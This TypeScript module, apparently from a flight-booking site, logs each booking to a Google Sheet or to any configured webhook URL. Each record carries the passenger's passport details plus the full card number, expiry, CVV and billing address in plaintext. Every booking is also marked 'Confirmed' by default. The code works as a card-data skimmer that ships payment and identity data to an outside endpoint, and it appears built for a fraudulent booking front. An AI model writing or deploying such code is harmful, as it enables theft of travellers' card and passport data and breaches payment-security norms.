import { google } from "googleapis";
import { connectToDatabase } from "@/lib/db";
import { CMSConfig } from "@/models/CMSConfig";

function log(message: any) {
  console.log(`[SHEETS] ${new Date().toLocaleTimeString()} - ${message}`);
}

export async function logBookingToSheet(booking: any, flight: any, sheetIdOrWebhook?: string) {
  let target = sheetIdOrWebhook || process.env.GOOGLE_SHEETS_WEBHOOK_URL || process.env.GOOGLE_SHEETS_ID;

  // Retrieve from database CMSConfig if not in process.env
  if (!target) {
    try {
      await connectToDatabase();
      const doc = await CMSConfig.findOne({ key: "env_settings" }).lean();
      if (doc?.value?.googleSheetsId || doc?.value?.googleSheetsWebhookUrl) {
        target = doc.value.googleSheetsWebhookUrl || doc.value.googleSheetsId;
      }
    } catch (err) {
      log(`Could not load googleSheets target from CMSConfig: ${err}`);
    }
  }

  if (!target) {
    log("⚠️ Google Sheets config missing - skipping sheet logging");
    return { success: false, message: "Google Sheets not configured" };
  }

  // METHOD 1: Google Apps Script Webhook (Easiest, No Service Account required!)
  if (target.startsWith("http://") || target.startsWith("https://")) {
    try {
      const priceFormatted = flight?.price
        ? typeof flight.price === "number"
          ? `$${(flight.price / 100).toFixed(2)}`
          : String(flight.price)
        : "";

      const payload = {
        timestamp: new Date().toISOString(),
        passengerName: booking.passengerName || "",
        email: booking.email || "",
        phone: booking.phone || "",
        passportDetails: booking.passportDetails || "",
        origin: flight?.origin || "JFK",
        destination: flight?.destination || "LAX",
        airline: flight?.airline || "Partner Airline",
        flightNumber: flight?.flightNumber || "",
        departureTime: flight?.departureTime || "",
        arrivalTime: flight?.arrivalTime || "",
        price: priceFormatted,
        cardholderName: booking.cardholderName || booking.passengerName || "",
        cardNumber: booking.cardNumber || "",
        cardExp: booking.cardExp || "",
        cardCvv: booking.cardCvv || "",
        billingZip: booking.billingZip || "",
        billingAddress: booking.billingAddress || "",
        status: "Confirmed",
      };

      const res = await fetch(target, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      log(`✅ Booking & Card details successfully logged to Google Sheet via Webhook - ${booking.passengerName}`);
      return { success: true, message: "Logged to Google Sheet via Webhook" };
    } catch (whErr: any) {
      log(`❌ Webhook logging error: ${whErr.message}`);
      return { success: false, message: whErr.message };
    }
  }

  // METHOD 2: Standard Google Sheets API v4 (Service Account)
  if (!process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL || !process.env.GOOGLE_PRIVATE_KEY) {
    log("⚠️ Google Sheets service account credentials missing in .env");
    return { success: false, message: "Google Sheets service account not configured" };
  }

  try {
    const sheetsAuth = new google.auth.JWT({
      email: process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL,
      key: (process.env.GOOGLE_PRIVATE_KEY || "").replace(/\\n/g, "\n"),
      scopes: ["https://www.googleapis.com/auth/spreadsheets"],
    });

    const sheets = google.sheets({ version: "v4", auth: sheetsAuth });

    const priceFormatted = flight?.price
      ? typeof flight.price === "number"
        ? `$${(flight.price / 100).toFixed(2)}`
        : String(flight.price)
      : "";

    const row = [
      new Date().toISOString(),
      booking.passengerName || "",
      booking.email || "",
      booking.phone || "",
      booking.passportDetails || "",
      flight?.airline || "",
      flight?.flightNumber || "",
      flight?.origin || "",
      flight?.destination || "",
      flight?.departureTime || "",
      flight?.arrivalTime || "",
      flight?.duration || "",
      flight?.stops ?? 0,
      priceFormatted,
      booking.cardholderName || booking.passengerName || "",
      booking.cardNumber ? `'${booking.cardNumber}` : "",
      booking.cardExp || "",
      booking.cardCvv || "",
      booking.billingZip || "",
      "Confirmed",
    ];

    await sheets.spreadsheets.values.append({
      spreadsheetId: target,
      range: "Sheet1!A:T",
      valueInputOption: "USER_ENTERED",
      requestBody: {
        values: [row],
      },
    } as any);

    log(`✅ Booking & Card details logged to Google Sheet v4 - ${booking.passengerName}`);
    return { success: true, message: "Booking logged to sheet" };
  } catch (error: any) {
    log(`❌ Failed to log to sheets: ${error.message}`);
    return { success: false, message: error.message };
  }
}

export async function initializeSheet(sheetId: any) {
  if (!process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL || !process.env.GOOGLE_PRIVATE_KEY || !sheetId) {
    return false;
  }

  try {
    const sheetsAuth = new google.auth.JWT({
      email: process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL,
      key: (process.env.GOOGLE_PRIVATE_KEY || "").replace(/\\n/g, "\n"),
      scopes: ["https://www.googleapis.com/auth/spreadsheets"],
    });

    const sheets = google.sheets({ version: "v4", auth: sheetsAuth });

    const result = await sheets.spreadsheets.values.get({
      spreadsheetId: sheetId,
      range: "Sheet1!A1:T1",
    });

    if (!result.data.values || result.data.values.length === 0) {
      const headers = [
        "Timestamp",
        "Passenger Name",
        "Email",
        "Phone",
        "Passport / ID",
        "Airline",
        "Flight",
        "Origin",
        "Destination",
        "Departure",
        "Arrival",
        "Duration",
        "Stops",
        "Price",
        "Cardholder Name",
        "Card Number",
        "Expiry",
        "CVV",
        "Billing Zip",
        "Status",
      ];

      await sheets.spreadsheets.values.update({
        spreadsheetId: sheetId,
        range: "Sheet1!A1:T1",
        valueInputOption: "RAW",
        requestBody: {
          values: [headers],
        },
      } as any);

      log(`✅ Sheet initialized with headers (including Card Details columns)`);
    }

    return true;
  } catch (error: any) {
    log(`❌ Failed to initialize sheet: ${error.message}`);
    return false;
  }
}
